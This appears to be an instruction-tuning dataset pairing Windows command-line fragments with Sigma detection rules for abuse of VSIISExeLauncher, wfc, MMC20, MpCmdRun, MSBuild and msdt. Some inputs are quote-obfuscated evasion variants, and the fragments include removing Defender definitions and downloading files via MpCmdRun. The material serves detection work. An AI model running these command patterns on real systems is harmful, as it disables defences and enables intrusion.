{"instruction": "Write Sigma rule to detect payload:", "input": "\\VSIISExeLauncher.exe VSIISExeLauncher.exe -p -a", "output": "title: Use of VSIISExeLauncher.exe\nid: 18749301-f1c5-4efc-a4c3-276ff1f5b6f8\nstatus: test\ndescription: The \"VSIISExeLauncher.exe\" binary part of the Visual Studio/VS Code can be used to execute arbitrary binaries\nreferences:\n    - https://lolbas-project.github.io/lolbas/OtherMSBinaries/VSIISExeLauncher/\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-06-09\ntags:\n    - attack.defense-evasion\n    - attack.t1127\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\VSIISExeLauncher.exe'\n        - OriginalFileName: 'VSIISExeLauncher.exe'\n    selection_cli:\n        CommandLine|contains:\n            - ' -p '\n            - ' -a '\n    condition: all of selection*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\VSIISExeLauncher.exe \"VSIISExeLauncher.exe\" \"-p\" -a", "output": "title: Use of VSIISExeLauncher.exe\nid: 18749301-f1c5-4efc-a4c3-276ff1f5b6f8\nstatus: test\ndescription: The \"VSIISExeLauncher.exe\" binary part of the Visual Studio/VS Code can be used to execute arbitrary binaries\nreferences:\n    - https://lolbas-project.github.io/lolbas/OtherMSBinaries/VSIISExeLauncher/\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-06-09\ntags:\n    - attack.defense-evasion\n    - attack.t1127\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\VSIISExeLauncher.exe'\n        - OriginalFileName: 'VSIISExeLauncher.exe'\n    selection_cli:\n        CommandLine|contains:\n            - ' -p '\n            - ' -a '\n    condition: all of selection*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\VSIISExeLauncher VSIISExeLauncher -p -a", "output": "title: Use of VSIISExeLauncher.exe\nid: 18749301-f1c5-4efc-a4c3-276ff1f5b6f8\nstatus: test\ndescription: The \"VSIISExeLauncher.exe\" binary part of the Visual Studio/VS Code can be used to execute arbitrary binaries\nreferences:\n    - https://lolbas-project.github.io/lolbas/OtherMSBinaries/VSIISExeLauncher/\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-06-09\ntags:\n    - attack.defense-evasion\n    - attack.t1127\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\VSIISExeLauncher.exe'\n        - OriginalFileName: 'VSIISExeLauncher.exe'\n    selection_cli:\n        CommandLine|contains:\n            - ' -p '\n            - ' -a '\n    condition: all of selection*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\VSIISExeLauncher.exe -p -a VSIISExeLauncher.exe", "output": "title: Use of VSIISExeLauncher.exe\nid: 18749301-f1c5-4efc-a4c3-276ff1f5b6f8\nstatus: test\ndescription: The \"VSIISExeLauncher.exe\" binary part of the Visual Studio/VS Code can be used to execute arbitrary binaries\nreferences:\n    - https://lolbas-project.github.io/lolbas/OtherMSBinaries/VSIISExeLauncher/\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-06-09\ntags:\n    - attack.defense-evasion\n    - attack.t1127\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\VSIISExeLauncher.exe'\n        - OriginalFileName: 'VSIISExeLauncher.exe'\n    selection_cli:\n        CommandLine|contains:\n            - ' -p '\n            - ' -a '\n    condition: all of selection*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\wfc.exe wfc.exe", "output": "title: Use of Wfc.exe\nid: 49be8799-7b4d-4fda-ad23-cafbefdebbc5\nstatus: test\ndescription: The Workflow Command-line Compiler can be used for AWL bypass and is listed in Microsoft's recommended block rules.\nreferences:\n    - https://lolbas-project.github.io/lolbas/OtherMSBinaries/Wfc/\n    - https://learn.microsoft.com/en-us/windows/security/application-security/application-control/windows-defender-application-control/design/applications-that-can-bypass-wdac\nauthor: 'Christopher Peacock @SecurePeacock, SCYTHE @scythe_io'\ndate: 2022-06-01\ntags:\n    - attack.defense-evasion\n    - attack.t1127\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Image|endswith: '\\wfc.exe'\n        - OriginalFileName: 'wfc.exe'\n    condition: selection\nfalsepositives:\n    - Legitimate use by a software developer\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\wfc.exe \\\"wfc\\\".exe", "output": "title: Use of Wfc.exe\nid: 49be8799-7b4d-4fda-ad23-cafbefdebbc5\nstatus: test\ndescription: The Workflow Command-line Compiler can be used for AWL bypass and is listed in Microsoft's recommended block rules.\nreferences:\n    - https://lolbas-project.github.io/lolbas/OtherMSBinaries/Wfc/\n    - https://learn.microsoft.com/en-us/windows/security/application-security/application-control/windows-defender-application-control/design/applications-that-can-bypass-wdac\nauthor: 'Christopher Peacock @SecurePeacock, SCYTHE @scythe_io'\ndate: 2022-06-01\ntags:\n    - attack.defense-evasion\n    - attack.t1127\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Image|endswith: '\\wfc.exe'\n        - OriginalFileName: 'wfc.exe'\n    condition: selection\nfalsepositives:\n    - Legitimate use by a software developer\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\wfc wfc", "output": "title: Use of Wfc.exe\nid: 49be8799-7b4d-4fda-ad23-cafbefdebbc5\nstatus: test\ndescription: The Workflow Command-line Compiler can be used for AWL bypass and is listed in Microsoft's recommended block rules.\nreferences:\n    - https://lolbas-project.github.io/lolbas/OtherMSBinaries/Wfc/\n    - https://learn.microsoft.com/en-us/windows/security/application-security/application-control/windows-defender-application-control/design/applications-that-can-bypass-wdac\nauthor: 'Christopher Peacock @SecurePeacock, SCYTHE @scythe_io'\ndate: 2022-06-01\ntags:\n    - attack.defense-evasion\n    - attack.t1127\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Image|endswith: '\\wfc.exe'\n        - OriginalFileName: 'wfc.exe'\n    condition: selection\nfalsepositives:\n    - Legitimate use by a software developer\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\wfc.exe wfc.exe", "output": "title: Use of Wfc.exe\nid: 49be8799-7b4d-4fda-ad23-cafbefdebbc5\nstatus: test\ndescription: The Workflow Command-line Compiler can be used for AWL bypass and is listed in Microsoft's recommended block rules.\nreferences:\n    - https://lolbas-project.github.io/lolbas/OtherMSBinaries/Wfc/\n    - https://learn.microsoft.com/en-us/windows/security/application-security/application-control/windows-defender-application-control/design/applications-that-can-bypass-wdac\nauthor: 'Christopher Peacock @SecurePeacock, SCYTHE @scythe_io'\ndate: 2022-06-01\ntags:\n    - attack.defense-evasion\n    - attack.t1127\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Image|endswith: '\\wfc.exe'\n        - OriginalFileName: 'wfc.exe'\n    condition: selection\nfalsepositives:\n    - Legitimate use by a software developer\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\svchost.exe \\mmc.exe -Embedding", "output": "title: MMC20 Lateral Movement\nid: f1f3bf22-deb2-418d-8cce-e1a45e46a5bd\nstatus: test\ndescription: Detects MMC20.Application Lateral Movement; specifically looks for the spawning of the parent MMC.exe with a command line of \"-Embedding\" as a child of svchost.exe\nreferences:\n    - https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/\n    - https://drive.google.com/file/d/1lKya3_mLnR3UQuCoiYruO3qgu052_iS_/view?usp=sharing\nauthor: '@2xxeformyshirt (Security Risk Advisors) - rule; Teymur Kheirkhabarov (idea)'\ndate: 2020-03-04\nmodified: 2021-11-27\ntags:\n    - attack.execution\n    - attack.lateral-movement\n    - attack.t1021.003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\svchost.exe'\n        Image|endswith: '\\mmc.exe'\n        CommandLine|contains: '-Embedding'\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\svchost.exe \"\\mmc.exe\" -Embedding", "output": "title: MMC20 Lateral Movement\nid: f1f3bf22-deb2-418d-8cce-e1a45e46a5bd\nstatus: test\ndescription: Detects MMC20.Application Lateral Movement; specifically looks for the spawning of the parent MMC.exe with a command line of \"-Embedding\" as a child of svchost.exe\nreferences:\n    - https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/\n    - https://drive.google.com/file/d/1lKya3_mLnR3UQuCoiYruO3qgu052_iS_/view?usp=sharing\nauthor: '@2xxeformyshirt (Security Risk Advisors) - rule; Teymur Kheirkhabarov (idea)'\ndate: 2020-03-04\nmodified: 2021-11-27\ntags:\n    - attack.execution\n    - attack.lateral-movement\n    - attack.t1021.003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\svchost.exe'\n        Image|endswith: '\\mmc.exe'\n        CommandLine|contains: '-Embedding'\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\svchost \\mmc -Embedding", "output": "title: MMC20 Lateral Movement\nid: f1f3bf22-deb2-418d-8cce-e1a45e46a5bd\nstatus: test\ndescription: Detects MMC20.Application Lateral Movement; specifically looks for the spawning of the parent MMC.exe with a command line of \"-Embedding\" as a child of svchost.exe\nreferences:\n    - https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/\n    - https://drive.google.com/file/d/1lKya3_mLnR3UQuCoiYruO3qgu052_iS_/view?usp=sharing\nauthor: '@2xxeformyshirt (Security Risk Advisors) - rule; Teymur Kheirkhabarov (idea)'\ndate: 2020-03-04\nmodified: 2021-11-27\ntags:\n    - attack.execution\n    - attack.lateral-movement\n    - attack.t1021.003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\svchost.exe'\n        Image|endswith: '\\mmc.exe'\n        CommandLine|contains: '-Embedding'\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\svchost.exe \\mmc.exe -Embedding", "output": "title: MMC20 Lateral Movement\nid: f1f3bf22-deb2-418d-8cce-e1a45e46a5bd\nstatus: test\ndescription: Detects MMC20.Application Lateral Movement; specifically looks for the spawning of the parent MMC.exe with a command line of \"-Embedding\" as a child of svchost.exe\nreferences:\n    - https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/\n    - https://drive.google.com/file/d/1lKya3_mLnR3UQuCoiYruO3qgu052_iS_/view?usp=sharing\nauthor: '@2xxeformyshirt (Security Risk Advisors) - rule; Teymur Kheirkhabarov (idea)'\ndate: 2020-03-04\nmodified: 2021-11-27\ntags:\n    - attack.execution\n    - attack.lateral-movement\n    - attack.t1021.003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\svchost.exe'\n        Image|endswith: '\\mmc.exe'\n        CommandLine|contains: '-Embedding'\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "MpCmdRun.exe \\MpCmdRun.exe MpCmdRun.exe DownloadFile url", "output": "title: File Download Via Windows Defender MpCmpRun.EXE\nid: 46123129-1024-423e-9fae-43af4a0fa9a5\nstatus: test\ndescription: Detects the use of Windows Defender MpCmdRun.EXE to download files\nreferences:\n    - https://web.archive.org/web/20200903194959/https://twitter.com/djmtshepana/status/1301608169496612866\n    - https://lolbas-project.github.io/lolbas/Binaries/MpCmdRun/\nauthor: Matthew Matchen\ndate: 2020-09-04\nmodified: 2023-11-09\ntags:\n    - attack.defense-evasion\n    - attack.t1218\n    - attack.command-and-control\n    - attack.t1105\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - OriginalFileName: 'MpCmdRun.exe'\n        - Image|endswith: '\\MpCmdRun.exe'\n        - CommandLine|contains: 'MpCmdRun.exe'\n        - Description: 'Microsoft Malware Protection Command Line Utility'\n    selection_cli:\n        CommandLine|contains|all:\n            - 'DownloadFile'\n            - 'url'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "MpCmdRun.exe \\MpCmdRun.exe MpCmdRun.exe \"Downlo\"adFile url", "output": "title: File Download Via Windows Defender MpCmpRun.EXE\nid: 46123129-1024-423e-9fae-43af4a0fa9a5\nstatus: test\ndescription: Detects the use of Windows Defender MpCmdRun.EXE to download files\nreferences:\n    - https://web.archive.org/web/20200903194959/https://twitter.com/djmtshepana/status/1301608169496612866\n    - https://lolbas-project.github.io/lolbas/Binaries/MpCmdRun/\nauthor: Matthew Matchen\ndate: 2020-09-04\nmodified: 2023-11-09\ntags:\n    - attack.defense-evasion\n    - attack.t1218\n    - attack.command-and-control\n    - attack.t1105\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - OriginalFileName: 'MpCmdRun.exe'\n        - Image|endswith: '\\MpCmdRun.exe'\n        - CommandLine|contains: 'MpCmdRun.exe'\n        - Description: 'Microsoft Malware Protection Command Line Utility'\n    selection_cli:\n        CommandLine|contains|all:\n            - 'DownloadFile'\n            - 'url'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "MpCmdRun \\MpCmdRun MpCmdRun DownloadFile url", "output": "title: File Download Via Windows Defender MpCmpRun.EXE\nid: 46123129-1024-423e-9fae-43af4a0fa9a5\nstatus: test\ndescription: Detects the use of Windows Defender MpCmdRun.EXE to download files\nreferences:\n    - https://web.archive.org/web/20200903194959/https://twitter.com/djmtshepana/status/1301608169496612866\n    - https://lolbas-project.github.io/lolbas/Binaries/MpCmdRun/\nauthor: Matthew Matchen\ndate: 2020-09-04\nmodified: 2023-11-09\ntags:\n    - attack.defense-evasion\n    - attack.t1218\n    - attack.command-and-control\n    - attack.t1105\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - OriginalFileName: 'MpCmdRun.exe'\n        - Image|endswith: '\\MpCmdRun.exe'\n        - CommandLine|contains: 'MpCmdRun.exe'\n        - Description: 'Microsoft Malware Protection Command Line Utility'\n    selection_cli:\n        CommandLine|contains|all:\n            - 'DownloadFile'\n            - 'url'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "MpCmdRun.exe DownloadFile url \\MpCmdRun.exe MpCmdRun.exe", "output": "title: File Download Via Windows Defender MpCmpRun.EXE\nid: 46123129-1024-423e-9fae-43af4a0fa9a5\nstatus: test\ndescription: Detects the use of Windows Defender MpCmdRun.EXE to download files\nreferences:\n    - https://web.archive.org/web/20200903194959/https://twitter.com/djmtshepana/status/1301608169496612866\n    - https://lolbas-project.github.io/lolbas/Binaries/MpCmdRun/\nauthor: Matthew Matchen\ndate: 2020-09-04\nmodified: 2023-11-09\ntags:\n    - attack.defense-evasion\n    - attack.t1218\n    - attack.command-and-control\n    - attack.t1105\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - OriginalFileName: 'MpCmdRun.exe'\n        - Image|endswith: '\\MpCmdRun.exe'\n        - CommandLine|contains: 'MpCmdRun.exe'\n        - Description: 'Microsoft Malware Protection Command Line Utility'\n    selection_cli:\n        CommandLine|contains|all:\n            - 'DownloadFile'\n            - 'url'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\MpCmdRun.exe MpCmdRun.exe -RemoveDefinitions -All", "output": "title: Windows Defender Definition Files Removed\nid: 9719a8aa-401c-41af-8108-ced7ec9cd75c\nstatus: test\ndescription: Adversaries may disable security tools to avoid possible detection of their tools and activities by removing Windows Defender Definition Files\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1562.001/T1562.001.md\n    - https://unit42.paloaltonetworks.com/unit42-gorgon-group-slithering-nation-state-cybercrime/\nauthor: frack113\ndate: 2021-07-07\nmodified: 2023-07-18\ntags:\n    - attack.defense-evasion\n    - attack.t1562.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\MpCmdRun.exe'\n        - OriginalFileName: MpCmdRun.exe\n    selection_cli:\n        CommandLine|contains|all:\n            - ' -RemoveDefinitions'\n            - ' -All'\n    condition: all of selection_*\nfields:\n    - ComputerName\n    - User\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\MpCmdRun.exe MpCmdRun.exe \\\"-RemoveDefinitions\\\" \\\"-All\\\"", "output": "title: Windows Defender Definition Files Removed\nid: 9719a8aa-401c-41af-8108-ced7ec9cd75c\nstatus: test\ndescription: Adversaries may disable security tools to avoid possible detection of their tools and activities by removing Windows Defender Definition Files\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1562.001/T1562.001.md\n    - https://unit42.paloaltonetworks.com/unit42-gorgon-group-slithering-nation-state-cybercrime/\nauthor: frack113\ndate: 2021-07-07\nmodified: 2023-07-18\ntags:\n    - attack.defense-evasion\n    - attack.t1562.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\MpCmdRun.exe'\n        - OriginalFileName: MpCmdRun.exe\n    selection_cli:\n        CommandLine|contains|all:\n            - ' -RemoveDefinitions'\n            - ' -All'\n    condition: all of selection_*\nfields:\n    - ComputerName\n    - User\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\MpCmdRun MpCmdRun -RemoveDefinitions -All", "output": "title: Windows Defender Definition Files Removed\nid: 9719a8aa-401c-41af-8108-ced7ec9cd75c\nstatus: test\ndescription: Adversaries may disable security tools to avoid possible detection of their tools and activities by removing Windows Defender Definition Files\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1562.001/T1562.001.md\n    - https://unit42.paloaltonetworks.com/unit42-gorgon-group-slithering-nation-state-cybercrime/\nauthor: frack113\ndate: 2021-07-07\nmodified: 2023-07-18\ntags:\n    - attack.defense-evasion\n    - attack.t1562.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\MpCmdRun.exe'\n        - OriginalFileName: MpCmdRun.exe\n    selection_cli:\n        CommandLine|contains|all:\n            - ' -RemoveDefinitions'\n            - ' -All'\n    condition: all of selection_*\nfields:\n    - ComputerName\n    - User\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\MpCmdRun.exe MpCmdRun.exe -All -RemoveDefinitions", "output": "title: Windows Defender Definition Files Removed\nid: 9719a8aa-401c-41af-8108-ced7ec9cd75c\nstatus: test\ndescription: Adversaries may disable security tools to avoid possible detection of their tools and activities by removing Windows Defender Definition Files\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1562.001/T1562.001.md\n    - https://unit42.paloaltonetworks.com/unit42-gorgon-group-slithering-nation-state-cybercrime/\nauthor: frack113\ndate: 2021-07-07\nmodified: 2023-07-18\ntags:\n    - attack.defense-evasion\n    - attack.t1562.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\MpCmdRun.exe'\n        - OriginalFileName: MpCmdRun.exe\n    selection_cli:\n        CommandLine|contains|all:\n            - ' -RemoveDefinitions'\n            - ' -All'\n    condition: all of selection_*\nfields:\n    - ComputerName\n    - User\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\MSBuild.exe MSBuild.exe \\devenv.exe \\cmd.exe \\msbuild.exe \\python.exe \\explorer.exe \\nuget.exe", "output": "title: Suspicious Msbuild Execution By Uncommon Parent Process\nid: 33be4333-2c6b-44f4-ae28-102cdbde0a31\nstatus: test\ndescription: Detects suspicious execution of 'Msbuild.exe' by a uncommon parent process\nreferences:\n    - https://app.any.run/tasks/abdf586e-df0c-4d39-89a7-06bf24913401/\n    - https://www.echotrail.io/insights/search/msbuild.exe\nauthor: frack113\ndate: 2022-11-17\ntags:\n    - attack.defense-evasion\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Image|endswith: '\\MSBuild.exe'\n        - OriginalFileName: 'MSBuild.exe'\n    filter_parent:\n        ParentImage|endswith:\n            - '\\devenv.exe'\n            - '\\cmd.exe'\n            - '\\msbuild.exe'\n            - '\\python.exe'\n            - '\\explorer.exe'\n            - '\\nuget.exe'\n    condition: selection and not filter_parent\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\MSBuild.exe MSBuild.exe \\devenv.exe \\cmd.exe \"\\msbuild.exe\" \\python.exe \\explorer.exe \\nuget.exe", "output": "title: Suspicious Msbuild Execution By Uncommon Parent Process\nid: 33be4333-2c6b-44f4-ae28-102cdbde0a31\nstatus: test\ndescription: Detects suspicious execution of 'Msbuild.exe' by a uncommon parent process\nreferences:\n    - https://app.any.run/tasks/abdf586e-df0c-4d39-89a7-06bf24913401/\n    - https://www.echotrail.io/insights/search/msbuild.exe\nauthor: frack113\ndate: 2022-11-17\ntags:\n    - attack.defense-evasion\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Image|endswith: '\\MSBuild.exe'\n        - OriginalFileName: 'MSBuild.exe'\n    filter_parent:\n        ParentImage|endswith:\n            - '\\devenv.exe'\n            - '\\cmd.exe'\n            - '\\msbuild.exe'\n            - '\\python.exe'\n            - '\\explorer.exe'\n            - '\\nuget.exe'\n    condition: selection and not filter_parent\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\MSBuild MSBuild \\devenv \\cmd \\msbuild \\python \\explorer \\nuget", "output": "title: Suspicious Msbuild Execution By Uncommon Parent Process\nid: 33be4333-2c6b-44f4-ae28-102cdbde0a31\nstatus: test\ndescription: Detects suspicious execution of 'Msbuild.exe' by a uncommon parent process\nreferences:\n    - https://app.any.run/tasks/abdf586e-df0c-4d39-89a7-06bf24913401/\n    - https://www.echotrail.io/insights/search/msbuild.exe\nauthor: frack113\ndate: 2022-11-17\ntags:\n    - attack.defense-evasion\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Image|endswith: '\\MSBuild.exe'\n        - OriginalFileName: 'MSBuild.exe'\n    filter_parent:\n        ParentImage|endswith:\n            - '\\devenv.exe'\n            - '\\cmd.exe'\n            - '\\msbuild.exe'\n            - '\\python.exe'\n            - '\\explorer.exe'\n            - '\\nuget.exe'\n    condition: selection and not filter_parent\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\MSBuild.exe MSBuild.exe \\devenv.exe \\cmd.exe \\msbuild.exe \\python.exe \\explorer.exe \\nuget.exe", "output": "title: Suspicious Msbuild Execution By Uncommon Parent Process\nid: 33be4333-2c6b-44f4-ae28-102cdbde0a31\nstatus: test\ndescription: Detects suspicious execution of 'Msbuild.exe' by a uncommon parent process\nreferences:\n    - https://app.any.run/tasks/abdf586e-df0c-4d39-89a7-06bf24913401/\n    - https://www.echotrail.io/insights/search/msbuild.exe\nauthor: frack113\ndate: 2022-11-17\ntags:\n    - attack.defense-evasion\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Image|endswith: '\\MSBuild.exe'\n        - OriginalFileName: 'MSBuild.exe'\n    filter_parent:\n        ParentImage|endswith:\n            - '\\devenv.exe'\n            - '\\cmd.exe'\n            - '\\msbuild.exe'\n            - '\\python.exe'\n            - '\\explorer.exe'\n            - '\\nuget.exe'\n    condition: selection and not filter_parent\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\msdt.exe msdt.exe -cab", "output": "title: Suspicious Cabinet File Execution Via Msdt.EXE\nid: dc4576d4-7467-424f-9eee-fd2b02855fe0\nrelated:\n    - id: 6545ce61-a1bd-4119-b9be-fcbee42c0cf3\n      type: obsolete\nstatus: test\ndescription: Detects execution of msdt.exe using the \"cab\" flag which could indicates suspicious diagcab files with embedded answer files leveraging CVE-2022-30190\nreferences:\n    - https://twitter.com/nas_bench/status/1537896324837781506\n    - https://github.com/GossiTheDog/ThreatHunting/blob/e85884abbf05d5b41efc809ea6532b10b45bd05c/AdvancedHuntingQueries/DogWalk-DiagCab\n    - https://github.com/elastic/protections-artifacts/commit/746086721fd385d9f5c6647cada1788db4aea95f#diff-9015912909545e72ed42cbac4d1e96295e8964579c406d23fd9c47a8091576a0\n    - https://irsl.medium.com/the-trouble-with-microsofts-troubleshooters-6e32fc80b8bd\nauthor: Nasreddine Bencherchali (Nextron Systems), GossiTheDog, frack113\ndate: 2022-06-21\nmodified: 2024-03-13\ntags:\n    - attack.defense-evasion\n    - attack.t1202\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\msdt.exe'\n        - OriginalFileName: 'msdt.exe'\n    selection_cmd:\n        CommandLine|contains|windash: ' -cab '\n    condition: all of selection_*\nfalsepositives:\n    - Legitimate usage of \".diagcab\" files\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\msdt.exe \\\"m\\\"\\\"s\\\"\\\"d\\\"\\\"t\\\"\\\".\\\"\\\"e\\\"\\\"x\\\"\\\"e\\\" -cab", "output": "title: Suspicious Cabinet File Execution Via Msdt.EXE\nid: dc4576d4-7467-424f-9eee-fd2b02855fe0\nrelated:\n    - id: 6545ce61-a1bd-4119-b9be-fcbee42c0cf3\n      type: obsolete\nstatus: test\ndescription: Detects execution of msdt.exe using the \"cab\" flag which could indicates suspicious diagcab files with embedded answer files leveraging CVE-2022-30190\nreferences:\n    - https://twitter.com/nas_bench/status/1537896324837781506\n    - https://github.com/GossiTheDog/ThreatHunting/blob/e85884abbf05d5b41efc809ea6532b10b45bd05c/AdvancedHuntingQueries/DogWalk-DiagCab\n    - https://github.com/elastic/protections-artifacts/commit/746086721fd385d9f5c6647cada1788db4aea95f#diff-9015912909545e72ed42cbac4d1e96295e8964579c406d23fd9c47a8091576a0\n    - https://irsl.medium.com/the-trouble-with-microsofts-troubleshooters-6e32fc80b8bd\nauthor: Nasreddine Bencherchali (Nextron Systems), GossiTheDog, frack113\ndate: 2022-06-21\nmodified: 2024-03-13\ntags:\n    - attack.defense-evasion\n    - attack.t1202\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\msdt.exe'\n        - OriginalFileName: 'msdt.exe'\n    selection_cmd:\n        CommandLine|contains|windash: ' -cab '\n    condition: all of selection_*\nfalsepositives:\n    - Legitimate usage of \".diagcab\" files\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\msdt msdt -cab", "output": "title: Suspicious Cabinet File Execution Via Msdt.EXE\nid: dc4576d4-7467-424f-9eee-fd2b02855fe0\nrelated:\n    - id: 6545ce61-a1bd-4119-b9be-fcbee42c0cf3\n      type: obsolete\nstatus: test\ndescription: Detects execution of msdt.exe using the \"cab\" flag which could indicates suspicious diagcab files with embedded answer files leveraging CVE-2022-30190\nreferences:\n    - https://twitter.com/nas_bench/status/1537896324837781506\n    - https://github.com/GossiTheDog/ThreatHunting/blob/e85884abbf05d5b41efc809ea6532b10b45bd05c/AdvancedHuntingQueries/DogWalk-DiagCab\n    - https://github.com/elastic/protections-artifacts/commit/746086721fd385d9f5c6647cada1788db4aea95f#diff-9015912909545e72ed42cbac4d1e96295e8964579c406d23fd9c47a8091576a0\n    - https://irsl.medium.com/the-trouble-with-microsofts-troubleshooters-6e32fc80b8bd\nauthor: Nasreddine Bencherchali (Nextron Systems), GossiTheDog, frack113\ndate: 2022-06-21\nmodified: 2024-03-13\ntags:\n    - attack.defense-evasion\n    - attack.t1202\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\msdt.exe'\n        - OriginalFileName: 'msdt.exe'\n    selection_cmd:\n        CommandLine|contains|windash: ' -cab '\n    condition: all of selection_*\nfalsepositives:\n    - Legitimate usage of \".diagcab\" files\nlevel: medium"}
